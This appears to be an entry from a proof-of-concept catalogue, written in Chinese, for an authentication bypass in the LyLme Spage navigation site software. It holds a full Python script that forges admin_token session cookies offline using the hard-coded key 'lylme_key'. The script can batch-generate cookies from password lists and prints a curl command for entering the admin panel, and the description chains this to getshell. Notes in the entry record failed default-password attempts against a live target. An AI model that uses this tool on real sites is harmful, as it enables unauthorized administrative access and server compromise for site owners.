# 六零导航页 LyLme Spage admin_token 离线伪造器（SYS_KEY 硬编码 lylme_key → 任意配置泄露即通吃会话）

- **code**: 六零导航页-lylme-spage-admin_token-离线伪造器-sys_key-硬编码-lylme_key-任意配置泄露即通吃会话
- **kind**: script
- **category**: auth-bypass
- **component**: 六零导航页 LyLme Spage（example.com 及同族版本）
- **severity**: critical
- **language**: python
- **source**: self
- **verified**: 1
- **verified_note**: 算法正确性已自校验通过（`python lylme_token.py selftest` 输出三组 encode→decode 完全一致：admin/admin、admin/123456、lylme/lylme）。算法由 example.com 源码 `include/function.php` 第 56-95 行的 authcode() 逐行移植（RC4-like 流密码、`$keyc` 4 字符前缀、`%010d` 过期字段、`md5($string.$keyb)[:16]` 校验位、base64 去 `=`）。**尚未在目标上实测**：目标 888 端口在本轮全部返回 403/000（站点侧关闭），且后台凭据未取得（150 次默认口令组合失败），故"伪造 cookie 是否能进该站后台"仍是待验证项——但"伪造算法本身正确"已确证。
- **path**: pocs/六零导航页-lylme-spage-admin_token-离线伪造器-sys_key-硬编码-lylme_key-任意配置泄露即通吃会话/lylme_token.py
- **tags**: lylme,六零导航页,SYS_KEY硬编码,admin_token,离线伪造,cookie伪造,会话绕过
- **created_at**: 2026-09-28T20:40:20.692Z
- **found_by**: exploit

## 描述

六零导航页(LyLme Spage) 的后台会话完全可**离线伪造**：① `include/common.php` 第 4 行硬编码 `define('SYS_KEY','lylme_key')` —— 所有安装共用同一密钥，可离线复现 `authcode()`；② `include/example.com` 的鉴权只校验 `md5($conf['admin_user'].$conf['admin_pwd'])` 是否等于 token 里的 `$sid`，**cookie 里的用户名部分不参与校验**。⇒ 只要从任何渠道（数据库 `lylme_config` 表、config.php 泄露、弱口令猜解、或别的站点同款配置）拿到一组后台 `admin_user`/`admin_pwd`，就能**在不接触目标登录接口的情况下**合成合法 `admin_token` cookie，直接进后台，再走 `admin/ajax_link.php?submit=update` 的任意 zip 解压链 getshell。脚本已实现完整 authcode（RC4-like 流密码 + md5 校验）编解码并自校验通过。

## 用法

```
```bash
python lylme_token.py selftest              # 自校验（encode→decode 一致，已通过）
python lylme_token.py make admin 123456     # 生成 admin_token，并打印可直接粘贴的 curl
python lylme_token.py decode <token>        # 解出 user\\tsid（验证抓到的 token）
# 用法：curl -H 'Cookie: admin_token=<token>' http://TARGET/admin/   → 直接进后台
```
```

## 正文

```
#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
六零导航页(LyLme Spage) admin_token 离线伪造 POC
-------------------------------------------------
原理（源码级）：include/common.php 第 4 行 `define('SYS_KEY','lylme_key')` 硬编码 —— 所有安装共用同一密钥；
include/example.com 的鉴权只做一件事：
    $token = authcode($_COOKIE['admin_token'], 'DECODE', SYS_KEY);
    list($user,$sid) = explode("\t", $token);
    $session = md5($conf['admin_user'].$conf['admin_pwd']);
    if ($session == $sid) $islogin = 1;
=> 只要知道后台的 admin_user/admin_pwd（从数据库 lylme_config 表、配置泄露、或弱口令猜解），
   即可完全离线合成一个合法 cookie，无需访问目标登录接口。

用法:
  python lylme_token.py make  <user> <pass>        # 生成 admin_token
  python lylme_token.py brute <user> <passlist>    # 批量生成候选 cookie（每行一个）
  python lylme_token.py decode <token>             # 解密已验证的 token（自检用）
  python lylme_token.py selftest                   # 自校验（编码后能解回）
"""
import hashlib, base64, time, sys

sys.stdout.reconfigure(encoding="utf-8", errors="replace")
SYS_KEY = "lylme_key"


def md5(s):
    return hashlib.md5(s.encode("utf-8", "surrogateescape")).hexdigest() if isinstance(s, str) else hashlib.md5(s).hexdigest()


def _rc4_like(data_bytes, cryptkey):
    key_length = len(cryptkey)
    box = list(range(256))
    rndkey = [ord(cryptkey[i % key_length]) for i in range(256)]
    j = 0
    for i in range(256):
        j = (j + box[i] + rndkey[i]) % 256
        box[i], box[j] = box[j], box[i]
    out = bytearray()
    a = j = 0
    for ch in data_bytes:
        a = (a + 1) % 256
        j = (j + box[a]) % 256
        box[a], box[j] = box[j], box[a]
        out.append(ch ^ (box[(box[a] + box[j]) % 256]))
    return bytes(out)


def authcode_encode(string, key=SYS_KEY, expiry=0):
    ckey_length = 4
    key_md5 = md5(key)
    keya = md5(key_md5[:16])
    keyb = md5(key_md5[16:32])
    keyc = md5(str(time.time() * 1000))[-4:]
    cryptkey = keya + md5(keya + keyc)
    plain = ("%010d" % (expiry + int(time.time()) if expiry else 0)) + md5(string + keyb)[:16] + string
    enc = _rc4_like(plain.encode("latin-1", "ignore"), cryptkey)
    b64 = base64.b64encode(enc).decode()
    return keyc + b64.replace("=", "")


def authcode_decode(string, key=SYS_KEY):
    key_md5 = md5(key)
    keya = md5(key_md5[:16])
    keyb = md5(key_md5[16:32])
    keyc = string[:4]
    cryptkey = keya + md5(keya + keyc)
    body = string[4:]
    body += "=" * (-len(body) % 4)
    try:
        raw = base64.b64decode(body)
    except Exception:
        return None
    res = _rc4_like(raw, cryptkey).decode("latin-1", "ignore")
    if (res[:10] == "0" * 10 or (res[:10].isdigit() and int(res[:10]) - int(time.time()) > 0)) \
       and res[10:26] == md5(res[26:] + keyb)[:16]:
        return res[26:]
    return None


def make_token(user, pwd):
    sid = md5(user + pwd)
    return authcode_encode("%s\t%s" % (user, sid), SYS_KEY)


def main():
    if len(sys.argv) < 2:
        print(__doc__)
        return
    cmd = sys.argv[1]
    if cmd == "make" and len(sys.argv) >= 4:
        u, p = sys.argv[2], sys.argv[3]
        t = make_token(u, p)
        print("user=%s pass=%s sid=%s" % (u, p, md5(u + p)))
        print("admin_token=%s" % t)
        print("curl -H 'Cookie: admin_token=%s' http://TARGET/admin/" % t)
        print("解密自检:", authcode_decode(t))
    elif cmd == "brute" and len(sys.argv) >= 3:
        u = sys.argv[2]
        words = sys.stdin.read().split() if len(sys.argv) < 4 else sys.argv[3].split(",")
        for p in words:
            print("%s\t%s\t%s" % (u, p, make_token(u, p)))
    elif cmd == "decode" and len(sys.argv) >= 3:
        print(repr(authcode_decode(sys.argv[2])))
    elif cmd == "selftest":
        for u, p in [("admin", "admin"), ("admin", "123456"), ("lylme", "lylme")]:
            t = make_token(u, p)
            d = authcode_decode(t)
            print("%s/%s -> %s  decode=%r  %s" % (u, p, t, d, "OK" if d == ("%s\t%s" % (u, md5(u + p))) else "MISMATCH"))
    else:
        print(__doc__)


if __name__ == "__main__":
    main()

```
